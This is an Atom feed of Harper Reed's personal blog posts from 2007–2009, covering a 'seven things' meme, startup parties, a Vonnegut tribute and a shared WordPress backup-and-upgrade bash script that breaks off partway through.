<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
 
 <title>Harper Reed: Tech, Mobile, Yo-yoing and Death Metal</title>
 <link href="http://www.nata2.org/atom.xml" rel="self"/>
 <link href="http://www.nata2.org"/>
 <updated>2010-07-12T16:56:29-05:00</updated>
 <id>http://www.nata2.org</id>

 
 <author>
   <name>Harper Reed</name>
   <email>harper@nata2.org</email>
 </author>
 
 
 
 <entry>
   <title>Seven Things (goddamn internet friends)</title>
   <link href="http://www.nata2.org/2009/01/11/seven-things-goddamn-internet-friends/"/>
   <updated>2009-01-11T00:00:00-06:00</updated>
   <id>http://www.nata2.org/2009/01/11/seven-things-goddamn-internet-friends</id>
   <content type="html">&lt;p style=&quot;clear: both&quot;&gt;I was tagged by both &lt;a href=&quot;http://eliw.wordpress.com/2009/01/05/seven-things/&quot;&gt;Eli White&lt;/a&gt; and &lt;a href=&quot;http://flinglog.com/text/seven-things/&quot;&gt;Brian Fling&lt;/a&gt; in this dastardly meme regarding 7 things. I am usually a HUGE fan of all things meme - and kind of regard myself as a &lt;a href=&quot;http://fukung.net&quot;&gt;certified&lt;/a&gt; meme expert. However this whole meme that requires a lot of work - I.E. blogging is something entirely different. I think i actually like it, but i am not entirely sure yet ;).&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;I do find it hilarious that almost every blog post regarding this seven things starts with a bit of self deprecation and surprise at how this meme stumbled upon innocent them. Well, it did come as a surprise - so I guess i understand.&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;Well here it goes. Seven things about me:&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;&lt;strong&gt;One:&lt;/strong&gt;&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;I grew up without a TV. When I was quite young (~3) my parents got rid of their TV. I am not completely sure why. I imagine it had something to do with money (the lack of) and priorities being making sure my brother and I were clothed and fed. My parents got their first TV after getting rid of the previous one when I was about 21. My parents used to rent a TV for big events (war, olympics, etc) and my brother and I would watch the TV manically until it was returned to the rental place. We also used to rent a TV and VCR about once or twice a year to watch all the movies we could in the time alloted. Those were awesome times. I currently don't have a TV.&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;&lt;strong&gt;Two:&lt;/strong&gt;&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;I have been paid to YoYo and Juggle in front of a LOT of people. I guess that makes me a professional. Heh. In college my two best buddies (&lt;a href=&quot;http://therats.org&quot;&gt;Matiss&lt;/a&gt; and Brian) and myself started a &quot;circus&quot; group. We juggled and did shows for all sorts of things. We opened for &lt;a href=&quot;http://en.wikipedia.org/wiki/Incubus_(band)&quot;&gt;Incubus&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/Sir_Mix_A_Lot&quot;&gt;Sir Mix A Lot&lt;/a&gt;, and a few other boring bands. We protest juggled as a group called Jugglers against homophobia - protesting people like &lt;a href=&quot;http://en.wikipedia.org/wiki/Elizabeth_Dole&quot;&gt;Elizabeth Dole&lt;/a&gt; and her homophobic antics. After college I continued to support my friends by juggling on the side. It was a really fun time. I don't juggle as much as i would like, but i still try to make it to conventions and what not. It is a lot of fun.&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;&lt;strong&gt;Three:&lt;/strong&gt;&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;My first computer was an Apple ][c. My dad got it in some trade. My brother and I would build text games in basic. Shortly after that I got in to BBSs. Mostly we called places like &lt;a href=&quot;http://www.totse.com/&quot;&gt;&amp;amp;totse&lt;/a&gt; and downloaded things that would get me in trouble. It was an awesome time. I suggest checking out the &lt;a href=&quot;http://www.bbsdocumentary.com/&quot;&gt;BBS Documentary&lt;/a&gt; to get an idea of how awesome it actually was.&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;&lt;strong&gt;Four:&lt;/strong&gt;&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;I met my lovely wife &lt;a href=&quot;http://hiromiusagi.com&quot;&gt;Hiromi&lt;/a&gt; while in college in iowa. We moved to Chicago together in 2001 to live together as roommates. Eventually, it became clear that our relationship was much more than that. We got married in 2006 and happily live in Chicago. She is awesome.&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;&lt;strong&gt;Five:&lt;/strong&gt;&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;I read a lot. I always have. Growing up without a TV will do that to a person. I read mostly fiction, but will stray to the dark side and read non-fiction every once and awhile. I usually read about an hour before going to bed. It helps calm me down and is a good way for me to get into the sleeping groove. I have recently been into ebooks and use a &lt;a href=&quot;http://www.amazon.com/gp/product/B000FI73MA?ie=UTF8&amp;amp;tag=nata2productions&amp;amp;link_code=as3&amp;amp;camp=211189&amp;amp;creative=373489&amp;amp;creativeASIN=B000FI73MA&quot;&gt;Amazon Kindle&lt;/a&gt; to read them. I find that I do miss regularly reading paper books, but the convenience of reading ebooks is awesome. I can't wait until the eInk displays and associated readers are smaller, easier to use and cheaper.&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;&lt;strong&gt;Six:&lt;/strong&gt;&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;I love David Bowie. It isn't a love that requires posters and discussion or anything. It is kind of similar to how people who grew up catholic talk about religion. David Bowie has just always been there for me. My first record I picked for myself was &lt;a href=&quot;http://en.wikipedia.org/wiki/The_Rise_and_Fall_of_Ziggy_Stardust_and_the_Spiders_from_Mars&quot;&gt;Ziggy Stardust&lt;/a&gt;. My first concert was the &lt;a href=&quot;http://en.wikipedia.org/wiki/Sound_and_Vision_Tour&quot;&gt;Bowie's Sound + Vision tour&lt;/a&gt;. When I was quite younger, my mom took me to get my hair cut and I brought along my &lt;a href=&quot;http://en.wikipedia.org/wiki/Labyrinth_(film)&quot;&gt;Labyrinth&lt;/a&gt; LP to show the stylist that I wanted &lt;a href=&quot;http://thefanboys.com/wp-content/uploads/2006/11/david_bowie_labyrinth.jpg&quot;&gt;David Bowie hair&lt;/a&gt;. I ended up with a rat tail.&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;&lt;strong&gt;Seven:&lt;/strong&gt;&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;Although I always knew I would end up with a Computer Science degree - I fought it as long as I could. In college I studied the history of Catholicism for a couple years before actually jumping into computer science. It was awesome. I ended up concentrating on &lt;a href=&quot;http://en.wikipedia.org/wiki/Giordano_Bruno&quot;&gt;Giordano Bruno&lt;/a&gt; and the his (untimely) multi-world theory. It was a lot of fun and lead me to have an unnatural interest in the mechanics of theology.&lt;/p&gt;


&lt;ol style=&quot;clear: both&quot;&gt;&lt;/ol&gt;


&lt;p style=&quot;clear: both&quot;&gt;&lt;strong&gt;That's it!&lt;/strong&gt;&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;To make this official, I now have to tag 7 people to make a Seven Things list on their blog.&lt;/p&gt;


&lt;p style=&quot;clear: both&quot;&gt;Ready? These Seven People please report to the meme office and make a Seven Things entry on your blog:&lt;/p&gt;


&lt;ol style=&quot;clear: both&quot;&gt;
&lt;li&gt;&lt;a href=&quot;http://dylanreed.com&quot;&gt;Dylan Reed&lt;/a&gt; - my brother - I like involving him in the blogosphere.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://morefishthanman.com/&quot;&gt;Scott Van Den Plas&lt;/a&gt; - crazy person - He has a great blog and I love including him in meme parties.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.localkinegrinds.com/&quot;&gt;Ryan Kanno&lt;/a&gt; - hawaii nerd - Ryan is hilarious. Hopefully all seven things will be about a Ukulele.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://prestosamo.blogspot.com/&quot;&gt;Cole Pierce&lt;/a&gt; - art nerd - Cole is one of my favorite artists. I used to make him go to terrible iowan raves.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lakshvivek.com/&quot;&gt;Lakshmi Nagarajan&lt;/a&gt; - friend and pro blogger - Lakshmi is an awesome &quot;mommy&quot; blogger who learned to drive a car in 2008. heh.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://anders.conbere.org/journal/&quot;&gt;Anders Conbere&lt;/a&gt; - xmpp nerd - Anders is awesome. I hope he picks this meme up.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.joevw.com/blog/&quot;&gt;Speedy Joe&lt;/a&gt; - awesome designer - Speedy just set up his blog. I wanted to give him some blogosphere love. ;)&lt;/li&gt;
&lt;/ol&gt;


&lt;p style=&quot;clear: both&quot;&gt;The rules of this &amp;acirc;&amp;euro;&amp;tilde;game&amp;acirc;&amp;euro;&amp;trade; for those that I have tagged:&lt;/p&gt;


&lt;ul style=&quot;clear: both&quot;&gt;
&lt;li&gt;Link your original tagger(s), and list these rules on your blog.&lt;/li&gt;
&lt;li&gt;Share seven facts about yourself in the post - some random, some weird.&lt;/li&gt;
&lt;li&gt;Tag seven people at the end of your post by leaving their names and the links to their blogs.&lt;/li&gt;
&lt;li&gt;Let them know they&amp;acirc;&amp;euro;&amp;trade;ve been tagged by leaving a comment on their blogs and/or Twitter&lt;/li&gt;
&lt;/ul&gt;


&lt;p style=&quot;clear: both&quot;&gt;There yea have it. I continued the meme. I am not one to be a meme killer ;) This was fun. Thanks to Eli and Brian for making it happen!&lt;/p&gt;


&lt;br class=&quot;final-break&quot; style=&quot;clear: both&quot;&gt;

</content>



 </entry>
 
 <entry>
   <title>Those parties were awesome!</title>
   <link href="http://www.nata2.org/2008/03/11/those-parties-were-awesome/"/>
   <updated>2008-03-11T00:00:00-05:00</updated>
   <id>http://www.nata2.org/2008/03/11/those-parties-were-awesome</id>
   <content type="html">&lt;p&gt;I am finally recovered from my flash travel/party tour. Being shuttled around the country going to parties is a rough life - let me tell you. It was awesome. I met some great people and saw some really cool stuff. It was really cool how much overlap occurred between the boulder crowd and SXSW. Startup people are fun. I want to run down the events and how they turned out. The first was boulder. &lt;a href=&quot;http://www.keepboulderweird.org/&quot;&gt;Boulder is a weird place&lt;/a&gt;. Seriously. It is strange. The boulder event was at this bar called the Foundry. I am guessing that if it wasn't packed to the gills with tech people from the front range, I would never go there. It was a pretty hilarious venue, however the tech people really filled it out. So it turned out to be a great choice. In boulder there were a lot of cool startups presenting. The one that really caught my eye was &lt;a href=&quot;http://socialthing.com&quot;&gt;Socialthing&lt;/a&gt;. These guys are sweet. They are doing a very simple and elegant solution for the crowded social aggregation space. Although I really like the community features of their direct competitor &lt;a href=&quot;http://friendfeed.com&quot;&gt;FriendFeed&lt;/a&gt;, I like the design and interface of socialthing alot. It is great - and they are sweet guys. There were a fair number of other startups, but unless they have real words in their names - i won't link them. Just kidding, but seriously - there were a fair number of people with startups that plain didn't have the best names. It is a bummer. Especially because the people were so nice and their ideas/technology seemed solid. It is &lt;a href=&quot;http://deliberately-different.blogspot.com/2006/02/how-they-named-companies.html&quot;&gt;hard to&lt;/a&gt; &lt;a href=&quot;http://www.salon.com/media/col/shal/1999/11/30/naming/print.html&quot;&gt;name a&lt;/a&gt; &lt;a href=&quot;http://blog.guykawasaki.com/2006/02/the_name_game.html&quot;&gt;company&lt;/a&gt;. Anyway - some of the not so awesomely named but awesome technology and problem solution startups in boulder are:&lt;/p&gt;

&lt;blockquote&gt;&lt;a href=&quot;http://Lijit.com&quot;&gt;Lijit.com&lt;/a&gt; - doing search for your blog. kinda like google site search, but with your social graph built in. Really cool stuff. &lt;a href=&quot;http://Villij.com&quot;&gt;Villij.com&lt;/a&gt; - not my favorite name. The guys are cool and they have some cool ideas about recommendations in the social graph space.&lt;/blockquote&gt;


&lt;p&gt;I also met a really awesome &quot;startup enabler&quot; named &lt;a href=&quot;http://jeremytanner.com/&quot;&gt;Jeremy Tanner&lt;/a&gt;. He seems to do what I do at Threadless for various startups in the Colorado scene. Jeremy moved from Detroit to Colorado - so he had a lot of input on how it was going from city to smaller city. He had great things to say about being able to jump on his motorcycle and head to the canyons for an awesome lunch time experience. After this event, I crashed at my hotel. Spent some time with my parents and was off to SXSW for ONE day! With much insanity, I finally made it to Austin and barely made it to the People Powered Powwow. It was awesome. Hearing the experiences of &lt;a href=&quot;http://etsy.com&quot;&gt;Etsy&lt;/a&gt;, &lt;a href=&quot;http://www.timbuk2.com/tb2/products/bagbuilder&quot;&gt;Timbuk2&lt;/a&gt;, &lt;a href=&quot;http://moo.com/&quot;&gt;Moo&lt;/a&gt;, &lt;a href=&quot;http://www.jpgmag.com/&quot;&gt;JPG&lt;/a&gt; and all the other awesome companies was quite inspiring. It was also awesome to meet the people who are behind all these awesome brands. It was like a secret people powered club where we all tell our people powering secrets. A really powerful meetup. I am glad that &lt;a href=&quot;http://richardmoross.com/&quot;&gt;Richard&lt;/a&gt; (from moo) set it up. it alone was worth the trip. Some of the companies that were there that I really liked:&lt;/p&gt;

&lt;blockquote&gt;&lt;a href=&quot;http://styleshake.com/user/&quot;&gt;Styleshake&lt;/a&gt; - I was surprised by this one. Styleshake is a neat community that helps facilitate custom dresses. Another thing I would have never guessed would be made into a crowd sourcing enterprise - but it works. And it seems to work well. The dresses are cool and the variations are impressive. If I was a svelte young woman I would certainly check this out. &lt;a href=&quot;http://www.burdastyle.com/&quot;&gt;BurdaStyle&lt;/a&gt; - I thought this was the coolest idea i had heard in awhile. Open source sewing patterns. Taking various patterns and releasing the designs to the community to create and manipulate. Helping to foster the crafting, sewing world as well as create awesome clothes.&lt;/blockquote&gt;


&lt;p&gt;After the mini conference, I was fortunate enough to have dinner with the JPG people and Wilson Minor (&lt;a href=&quot;http://everyblock.com&quot;&gt;EveryBlock&lt;/a&gt;). We ate at some nice Mexican food place. It was good, better than Chicago Mexican food. Then I made my way to the soon to be &lt;a href=&quot;http://upcoming.yahoo.com/event/430139/&quot;&gt;bumping party&lt;/a&gt;. The party was fun. There were a lot of people. Floss seemed to be well accepted and it was awesome to meet &lt;a href=&quot;http://www.kidkameleon.com/&quot;&gt;kid kameleon&lt;/a&gt;. Around this time I had the awesomeness to bump into a dude from &lt;a href=&quot;http://www.threadbanger.com/&quot;&gt;Threadbangers&lt;/a&gt;. he was able to capture my &lt;a href=&quot;http://www.threadbanger.com/episode/SXSW_20080310&quot;&gt;natural retardedness for an episode of threadbangers&lt;/a&gt;. haha. Whew. After my debut in amazing, I was able to take a minute and meet up with some friends. It is fun to hang out with Chicago friends when not in Chicago. I met up with &lt;a href=&quot;http://jacobdehart.com&quot;&gt;Jacob DeHart&lt;/a&gt;, &lt;a href=&quot;http://bloxes.com/&quot;&gt;Aza Raskin&lt;/a&gt;, &lt;a href=&quot;http://www.srobbin.com/&quot;&gt;Scott Robbin&lt;/a&gt;, &lt;a href=&quot;http://www.humanized.com/about/&quot;&gt;Andrew Wilson&lt;/a&gt;. Another person I was thrilled to meet up with is &lt;a href=&quot;http://mediadiet.net/&quot;&gt;Heath Row&lt;/a&gt;. Heath has always been a favorite person of mine and it is great (and rare) to hang out in person. After the party died down - we all went to the &lt;a href=&quot;http://PureVolume.com&quot;&gt;Pure Volume&lt;/a&gt; ranch for the Social Thing party and my trip came full circle. I was able to meet up with the Lijit, Villij and Socialthing guys. After rocking out there for a couple hours i decided to head home, sleep and finally attempt to make my way back to Chicago. I barely made it. ;)&lt;/p&gt;
</content>



 </entry>
 
 <entry>
   <title>A email response from a friend</title>
   <link href="http://www.nata2.org/2007/10/17/a-email-response-from-a-friend/"/>
   <updated>2007-10-17T00:00:00-05:00</updated>
   <id>http://www.nata2.org/2007/10/17/a-email-response-from-a-friend</id>
   <content type="html">&lt;p&gt;Awhile ago I got this email from a friend. It is about the Medical Marijuana problem with Iraq veterans. I thought you guys might like to read it. So here it is:&lt;/p&gt;

&lt;blockquote&gt;I just read the article you posted about medical marijuana and veterans and it definitely was intense. Its a shame that they are not getting taken care of. That particular guy says that there were no nightmares and his limbs were intact, which is very lucky. I have friends that came back from Iraq in the last year or so and it is scary to see the change. First off, only one of them has agreed to come out and interact with us again. My friend John is a Marine and was stationed mainly in Ramadi. John had always been an interesting character, but since Iraq he has lost all innocence. He's still very spontaneous and wacky, but in a very bitter way. He acts as he does because he's so angry that popped collars walk around thinking that they are kings, and John is not treated as a king coming back home. He won't talk about most of what happened over there, only few of the fonder memories. His best friend was basically blown up in front of him, leaving a wife and child in California. One particular weekend, John and I went to CU to visit my now ex. Very stressful nights that weekend. John got shit ass drunk as quickly as possible and yelled at everyone on the streets for being able to enjoy their 20 something years. We got kicked out of two bars in half an hour, then John decided to disappear for the rest of the night. He'd come back in one hour, two hour, three hour intervals and take off again. Talking to him on the ride there and back was ridiculously difficult. Making small talk was pointless, and talking about Iraq was too personal. Every time he came back home he pulled the same disappearing act, completely disregarding the fact that we were worried about him.It just broke my heart to see how badly he wished he was still naive. He was sent to Iraq for a second trip, and I have since lost contact with him or friends that would know where he was. That article totally hit a sore spot in my heart for these guys out there. In no way am I a supporter of the war or the military, but I completely support the individuals that decide to put themselves into the military. This line from the article, 'My wife was the love of my life, the girl I wanted to spend the rest of my life with, but when I came back from Iraq, she was now a complete stranger to me, as I was to her.' is an issue that most vets deal with, its really fucking sad.&lt;/blockquote&gt;


&lt;p&gt;Yep. Its insane how the government is creating a state of war that most people don't want, then not supporting the troops as much as they need to be supported. We need this to stop.&lt;/p&gt;
</content>



 </entry>
 
 <entry>
   <title>Goddamn Stoners!</title>
   <link href="http://www.nata2.org/2007/06/27/goddamn-stoners/"/>
   <updated>2007-06-27T00:00:00-05:00</updated>
   <id>http://www.nata2.org/2007/06/27/goddamn-stoners</id>
   <content type="html">&lt;p&gt;A friend of mine works for &lt;a href=&quot;http://www.hightimes.com/ht/home/&quot;&gt;high times&lt;/a&gt;. So Charlie and I figured we would send them a small swag package - and then they would send us a swag package. Fun fun. And a simple transaction.. or so we thought.&lt;/p&gt;


&lt;p&gt;Natasha is my friend who works for High Times.&lt;/p&gt;


&lt;p&gt;Here is our chat log:&lt;/p&gt;


&lt;p&gt;&lt;em&gt;6/11/2007&lt;/em&gt;&lt;/p&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Natasha&lt;/strong&gt;: hey what's the address there?&lt;br&gt;
&lt;strong&gt;Harper&lt;/strong&gt;: [address redacted]&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: alright!&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: will be sending you out a box!!&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: fancy&lt;br&gt;
&lt;strong&gt;Harper&lt;/strong&gt;: awesome!&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: yeah!&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;&lt;em&gt;6/19/2007&lt;/em&gt;&lt;/p&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Natasha&lt;/strong&gt;: hey dude i just got back from tennessee and the package i&lt;br&gt;
sent was on my desk waiting.&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: i think i got the address wrong&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: so i figured out what was wrong with the address i sent&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: total dyslexia&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: Woodravens Ave.&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: yay!&lt;br&gt;
&lt;strong&gt;Harper&lt;/strong&gt;: haha&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;&lt;em&gt;6/27/2007&lt;/em&gt;&lt;/p&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Harper&lt;/strong&gt;: we are so lost without our package&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: fucking stoners.&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: you never got it?&lt;br&gt;
&lt;strong&gt;Harper&lt;/strong&gt;: nope&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: that's super awesome&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: i've got a tracking number&lt;br&gt;
&lt;strong&gt;Harper&lt;/strong&gt;: oh yes!&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: HAHAHAHA it was sent to 419 Park Ave. South NY, NY 10016&lt;br&gt;
&lt;strong&gt;Natasha&lt;/strong&gt;: that's us&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;Awesome! I love this shit!&lt;/p&gt;


&lt;p&gt;(In defense of Natasha - it was the mailroom and not her. She is totally able to ship stuff!)&lt;/p&gt;


&lt;div class=&quot;wlWriterSmartContent&quot; id=&quot;0767317B-992E-4b12-91E0-4F059A8CECA8:ab139160-9d1e-4c1b-917c-0ffe8eb4a932&quot; contenteditable=&quot;false&quot; style=&quot;padding-right: 0px; display: inline; padding-left: 0px; padding-bottom: 0px; margin: 0px; padding-top: 0px&quot;&gt;[tags]humor, hilarious, life, shipping, high times, stoners[/tags]&lt;/div&gt;



</content>



 </entry>
 
 <entry>
   <title>A Sad Day. RIP Kurt Vonnegut.</title>
   <link href="http://www.nata2.org/2007/04/12/a-sad-day-rip-kurt-vonnegut/"/>
   <updated>2007-04-12T00:00:00-05:00</updated>
   <id>http://www.nata2.org/2007/04/12/a-sad-day-rip-kurt-vonnegut</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;http://farm1.static.flickr.com/234/456138744_bd159ed29d_m.jpg&quot; align=&quot;right&quot;&gt;Yesterday &lt;a href=&quot;http://en.wikipedia.org/wiki/Kurt_Vonnegut&quot;&gt;Kurt Vonnegut&lt;/a&gt;, one of my favorite authors and a pillar my my upbringing, died. He was 84. I read my first Kurt Vonnegut book, &lt;a href=&quot;http://www.amazon.com/Slapstick-Lonesome-More-Kurt-Vonnegut/dp/0385334230/ref=pd_bbs_sr_10/104-8140476-8316711?ie=UTF8&amp;amp;s=books&amp;amp;qid=1176359408&amp;amp;sr=8-10&quot;&gt;Slapstick&lt;/a&gt;, &amp;nbsp;when I was in 5th grade. It was really amazing. I was quite a bit young for the book, but it was a great follow up to &lt;a href=&quot;http://www.amazon.com/Catch-22-Novel-Simon-Schuster-Classics/dp/0684865130/ref=pd_bbs_sr_1/104-8140476-8316711?ie=UTF8&amp;amp;s=books&amp;amp;qid=1176360307&amp;amp;sr=1-1&quot;&gt;Catch-22&lt;/a&gt;. hah. I still remember Slapstick and think about it quite often.&lt;/p&gt;


&lt;p&gt;~ hi ho ~&lt;/p&gt;


&lt;p&gt;I think that is my Favorite Kurt Vonnegut book.&lt;/p&gt;


&lt;p&gt;Kurt Vonnegut made quite the impact on me.&amp;nbsp;My father was a big Vonnegut fan and recommended that I read his books constantly. As&amp;nbsp; grew older we were able to share the jokes, and the excitement of Vonnegut's novels. It was a great thing to share with your loved ones. I continue to push Kurt Vonnegut's books on to my friends and family as much as I can. His novels are always quirky and fun. They reminded me that life isn't always serious, even if serious things are happening.&amp;nbsp; The single biggest piece of knowledge I gleaned from his novels was the theme that&amp;nbsp;we need to treat people well. His books were a great commentary on why more humanist values are needed in our world. If anyone is wondering what is wrong with the world, read a bundle of Kurt Vonnegut, a couple Studs Terkel and Joseph Heller's Catch-22. You will be set right.&lt;/p&gt;


&lt;p&gt;I once was able to meet and speak a small amount with Kurt Vonnegut when he spoke at a school in the Chicago suburbs. He talked about humanism and being old. He mentioned how he felt a humanist funeral should&amp;nbsp;be. It was very humorous. I took a picture of Kurt Vonnegut and me and gave&amp;nbsp;it to my father.&lt;/p&gt;


&lt;p&gt;In regards to death,&amp;nbsp; I feel that Kurt Vonnegut's version of death and afterlife is the closest to my own beliefs on the matter.&amp;nbsp;In Studs Terkel's book&amp;nbsp;&quot;&lt;i&gt;&lt;a href=&quot;http://www.amazon.com/Will-Circle-Unbroken-Reflections-Ballantine/dp/0345451201/ref=pd_bbs_sr_7/104-8140476-8316711?ie=UTF8&amp;amp;s=books&amp;amp;qid=1176360262&amp;amp;sr=8-7&quot;&gt;Will the Circle Be Unbroken? Reflections on Death, Rebirth, and Hunger for a Faith&lt;/a&gt;,&lt;/i&gt;&quot; Studs interviews Vonnegut on death and Vonnegut &lt;a href=&quot;http://speakingoffaith.publicradio.org/programs/studsterkel/vonnegut.shtml&quot;&gt;says the following&lt;/a&gt;:&lt;/p&gt;


&lt;blockquote&gt;
&lt;p&gt;What the freethinkers were are now called humanists. I am one. A humanist believes, because of Darwin, whose truths were so shocking, in making the most use of good science as possible. Humanists behave well without any expectation of either reward or punishment in an afterlife. We serve, as best we can, our community. When I was growing up, nobody ever said anything about Heaven, about an afterlife. They said that this life was enough.&lt;/p&gt;
&lt;p&gt;I have experienced what happens when I die, and so have you. We call it sleep.&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;This is the basis for my beliefs and I feel is pretty much the basis for the humanist movement. You need to do good. right now. because you may not be here soon. and you may not be here tomorrow. and since there is no afterlife, this is the best and there is no waiting for the better to happen. so lets have fun and enjoy what we have!&lt;/p&gt;


&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;Hello, babies. Welcome to Earth. It&amp;rsquo;s hot in the summer and cold in the winter. It&amp;rsquo;s round and wet and crowded. At the outside, babies, you&amp;rsquo;ve got about a hundred years here. There&amp;rsquo;s only one rule that I know of, babies &amp;mdash; &amp;lsquo;God damn it, you&amp;rsquo;ve got to be kind.&amp;rsquo; &amp;rdquo;&lt;/p&gt;
&lt;p&gt;- Kurt Vonnegut, Jr. (November 11, 1922 - April 11, 2007)&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;So it goes.&lt;/p&gt;


&lt;div class=&quot;wlWriterSmartContent&quot; id=&quot;0767317B-992E-4b12-91E0-4F059A8CECA8:38b4925d-f122-4be7-89cf-474a253a242f&quot; contenteditable=&quot;false&quot; style=&quot;padding-right: 0px; display: inline; padding-left: 0px; padding-bottom: 0px; margin: 0px; padding-top: 0px&quot;&gt;[tags]kurt vonnegut, authors, literature, death, sad, life, novels, books, growing up[/tags]&lt;/div&gt;



</content>



 </entry>
 
 <entry>
   <title>My upgrade wordpress script</title>
   <link href="http://www.nata2.org/2007/03/31/my-upgrade-wordpress-script/"/>
   <updated>2007-03-31T00:00:00-05:00</updated>
   <id>http://www.nata2.org/2007/03/31/my-upgrade-wordpress-script</id>
   <content type="html">&lt;p&gt;I broke my blog the other day. It was a pain in the ass. I don't really know what happened - just that it broke. So I was thinking, I hate upgrading my wordpress. I hate it. I agree 100% with &lt;a href=&quot;http://www.mattcutts.com/blog/upgrading-wordpress/&quot;&gt;Matt Cutts&lt;/a&gt; about how wordpress has one of the most clunky and cruft creating upgrade process. So annoying. And it gets even more annoying when you are doing it with 50 blogs. stupid friends. hah. So awhile ago I created this script which basically lets me just execute a small number of commands to upgrade a wordpress blog. If a script isn't really your thing, it seems like the best way to handle wordpress upgrades is to use SVN to do them. I am going to look into the best way to do that, but my experience so far in that experiment has shown me that the bleeding edge release of wordpress is not always a working release. ;) &lt;a href=&quot;http://photomatt.net/&quot;&gt;Matt&lt;/a&gt; from wordpress &lt;a href=&quot;http://www.mattcutts.com/blog/upgrading-wordpress/#comment-100841&quot;&gt;comments&lt;/a&gt; on Matt Cutt's blog about the existence of a &lt;a href=&quot;http://www.zirona.com/software/wordpress-instant-upgrade/&quot;&gt;upgrade plugin&lt;/a&gt; - which seems really interesting. hmm.. So anyway. The script... I am warning you that this script HAS KILLED AT LEAST ONE BLOG. hah. but it has also regularly upgraded at least 50 blogs as well. So.. use at your own risk. and feel free to modify and fix stuff that you see. I am assuming that your web layout is:&lt;/p&gt;

&lt;blockquote&gt;/ &lt;em&gt;- root of domain&lt;/em&gt; /web &lt;em&gt;- blogs webroot&lt;/em&gt; /archive &lt;em&gt;- archive for old backups&lt;/em&gt;&lt;/blockquote&gt;


&lt;p&gt;If your layout differs it will not be too hard to change the vars and make the script work for you. The script will backup your wordpress DB, tar up your wordpress dir, download the newest version of wordpress, untar the new wordpress, and then move all your wp-content and what not into the new wordpress dir. It then puts all the backups into a dated folder in the archive dir. then cleans up a bit after itself. The script does not account for any customizations at all. If you have any files that are placed in the webroot, or files that are not in their normal places, it will not work at all. Honestly - unless you know what you are doing and really want to play Russian roulette of the bash kind - I wouldn't use this script. ;)&lt;/p&gt;

&lt;blockquote&gt;#!/bin/bash # Dirs webdir=&quot;web&quot; archivedir=&quot;archive&quot; # Mysql credentials database=&quot;wordpress mysql database&quot; username=&quot;wordpress mysql username&quot; password=&quot;wordpress mysql password&quot; #the meat of the script echo &quot;Wordpress upgrade script&quot; echo &quot;* Backing up wordpress db&quot; /usr/local/mysql/bin/mysqldump $database -u $username -p$password &amp;gt; sql_backup_`date +&quot;%m-%d-%Y&quot;`.sql echo &quot;* Gzipping wordpress sql&quot; gzip sql_backup_`date +&quot;%m-%d-%Y&quot;`.sql mkdir wordpress.backup_`date +&quot;%m-%d-%Y&quot;` mv sql_backup_`date +&quot;%m-%d-%Y&quot;`.sql.gz wordpress.backup_`date +&quot;%m-%d-%Y&quot;` mkdir wp-backup_`date +&quot;%m-%d-%Y&quot;` cd $webdir echo &quot;* Backing up the old wordpress&quot; tar zcf ../wordpress.backup_`date +&quot;%m-%d-%Y&quot;`/$webdir.backup_`date +&quot;%m-%d-%Y-%T&quot;`.tgz . cp -a wp-config.php ../wp-backup_`date +&quot;%m-%d-%Y&quot;` cp -a wp-content ../wp-backup_`date +&quot;%m-%d-%Y&quot;` cp -a wp-images ../wp-backup_`date +&quot;%m-%d-%Y&quot;` cp -a .htaccess ../wp-backup_`date +&quot;%m-%d-%Y&quot;` cd ../wp-backup_`date +&quot;%m-%d-%Y&quot;` echo &quot;* 